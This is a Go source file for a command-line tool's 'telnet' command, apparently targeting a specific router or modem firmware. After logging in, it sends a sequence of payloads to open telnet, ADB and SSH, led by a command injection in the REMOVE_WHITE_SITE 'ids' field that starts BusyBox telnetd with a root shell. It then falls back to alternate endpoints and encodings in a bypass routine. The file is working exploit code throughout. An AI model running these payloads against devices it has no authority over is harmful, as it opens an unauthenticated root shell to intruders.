package cmd

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/anusara-bemal/zlt_xloader/internal/profile"
	"github.com/anusara-bemal/zlt_xloader/pkg/netutil"
)

var (
	telnetSkipLogin bool
	telnetBypass    bool
)

var telnetCmd = &cobra.Command{
	Use:   "telnet",
	Short: "Try to enable telnet/ADB and verify port 23",
	Long: `Logs in with the S20_1.12.7 flow and tries the known telnet/ADB
payloads in order, checking port 23 after each attempt.

The primary method is a command injection in REMOVE_WHITE_SITE's ids field,
which starts BusyBox telnetd as root. TZ_CMD_SECURE_LOGIN is tried as a
fallback. Nothing is sent unless --dry-run=false.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if app.DryRun {
			log.Warn("DRY-RUN: payloads will not be sent; port 23 is still checked")
		}

		if !telnetSkipLogin {
			user := app.Profile.Login.Username
			pass := app.Profile.Login.Password
			if err := app.API.Login(user, pass); err != nil {
				return fmt.Errorf("login failed: %w", err)
			}
			log.Infof("authenticated; CSRFToken=%s", app.API.Token())
		}

		methods := []struct {
			name string
			p    profile.Payload
		}{
			{"REMOVE_WHITE_SITE injection", profile.Payload{
				ID: "REMOVE_WHITE_SITE", Method: "POST",
				Args: map[string]string{"isTest": "false", "ids": "1 $(/bin/busybox telnetd -l /bin/sh)"},
			}},
			{"REMOVE_WHITE_SITE (telnetd)", profile.Payload{
				ID: "REMOVE_WHITE_SITE", Method: "POST",
				Args: map[string]string{"isTest": "false", "ids": "1 $(telnetd -l /bin/sh)"},
			}},
			{"TZ_CMD_SECURE_LOGIN (y)", profile.Payload{
				ID: "TZ_CMD_SECURE_LOGIN", Method: "POST",
				Args: map[string]string{"isTest": "false", "telnetdEnable": "y", "adbEnable": "y", "dropbearEnable": "y"},
			}},
			{"TZ_CMD_SECURE_LOGIN (1)", profile.Payload{
				ID: "TZ_CMD_SECURE_LOGIN", Method: "POST",
				Args: map[string]string{"isTest": "false", "telnetdEnable": "1", "adbEnable": "1", "dropbearEnable": "1"},
			}},
			{"TZ_CMD_SECURE_LOGIN (telnet only)", profile.Payload{
				ID: "TZ_CMD_SECURE_LOGIN", Method: "POST",
				Args: map[string]string{"isTest": "false", "telnetdEnable": "y"},
			}},
			{"SET_WEB_LANGUAGE (adb)", profile.Payload{
				ID: "SET_WEB_LANGUAGE", Method: "POST",
				Args: map[string]string{"isTest": "false", "Language": "en", "adbd_enable": "1"},
			}},
			{"SET_SYSTEM_INFO (telnet)", profile.Payload{
				ID: "SET_SYSTEM_INFO", Method: "POST",
				Args: map[string]string{"isTest": "false", "telnetd_enable": "1"},
			}},
		}

		for _, m := range methods {
			r := app.API.Try(m.p)
			switch {
			case r.Err != nil:
				fmt.Printf("%-32s ERROR %v\n", m.name, r.Err)
			case strings.TrimSpace(r.Body) == "":
				fmt.Printf("%-32s empty reply (handler rejected request)\n", m.name)
			case r.Hit:
				fmt.Printf("%-32s %s\n", m.name, strings.TrimSpace(r.Body))
			default:
				fmt.Printf("%-32s %s\n", m.name, strings.TrimSpace(r.Body))
			}

			if netutil.ScanPort(app.Target, 23, app.Timeout) {
				log.Infof("telnet is OPEN on %s:23", app.Target)
				return nil
			}
		}

		if telnetBypass {
			if opened, detail := transportBypass(app); opened {
				log.Infof("telnet is OPEN on %s:23 (%s)", app.Target, detail)
				return nil
			}
		}

		log.Warnf("telnet is still closed on %s:23", app.Target)
		fmt.Println()
		fmt.Println("Next steps for this firmware build:")
		fmt.Println("  - TZ_CMD_SECURE_LOGIN may be disabled in the shipped firmware;")
		fmt.Println("    try the UART/AT path (uart-at) or a TR-069 configuration push.")
		fmt.Println("  - Check 'cmd=telnetd_enable&isTest=false' — an empty value usually")
		fmt.Println("    means the telnet daemon is not present in this build.")
		return nil
	},
}

// transportBypass tries alternate encodings and endpoints for the secure
// service command. It is a last-resort probe, not a guaranteed unlock.
func transportBypass(app *AppContext) (bool, string) {
	token := app.API.Token()
	args := url.Values{}
	args.Set("goformId", "TZ_CMD_SECURE_LOGIN")
	args.Set("isTest", "false")
	args.Set("telnetdEnable", "y")
	args.Set("adbEnable", "y")
	args.Set("dropbearEnable", "y")
	args.Set("CSRFToken", token)

	payload := map[string]any{
		"goformId": "TZ_CMD_SECURE_LOGIN", "isTest": false,
		"telnetdEnable": "y", "adbEnable": "y", "dropbearEnable": "y",
		"CSRFToken": token,
	}
	jsonBody, _ := json.Marshal(payload)

	probes := []struct {
		name string
		send func() ([]byte, error)
	}{
		{"GET query on proc_post", func() ([]byte, error) {
			return app.API.GetRawQuery("/reqproc/proc_post?" + args.Encode())
		}},
		{"JSON body", func() ([]byte, error) {
			return app.API.PostRaw("/reqproc/proc_post", "application/json", jsonBody)
		}},
		{"legacy goform endpoint", func() ([]byte, error) {
			return app.API.PostRaw("/goform/goform_set_cmd_process",
				"application/x-www-form-urlencoded", []byte(args.Encode()))
		}},
		{"POST on proc_get", func() ([]byte, error) {
			return app.API.PostRaw("/reqproc/proc_get",
				"application/x-www-form-urlencoded", []byte(args.Encode()))
		}},
	}

	for _, probe := range probes {
		body, err := probe.send()
		if err != nil {
			fmt.Printf("  %-26s ERROR %v\n", probe.name, err)
		} else {
			fmt.Printf("  %-26s %s\n", probe.name, strings.TrimSpace(string(body)))
		}
		if netutil.ScanPort(app.Target, 23, app.Timeout) {
			return true, probe.name
		}
	}
	return false, ""
}

func init() {
	telnetCmd.Flags().BoolVar(&telnetBypass, "bypass", false, "try alternate encodings and endpoints")
	telnetCmd.Flags().BoolVar(&telnetSkipLogin, "skip-login", false, "skip the LOGIN flow")
	rootCmd.AddCommand(telnetCmd)
}
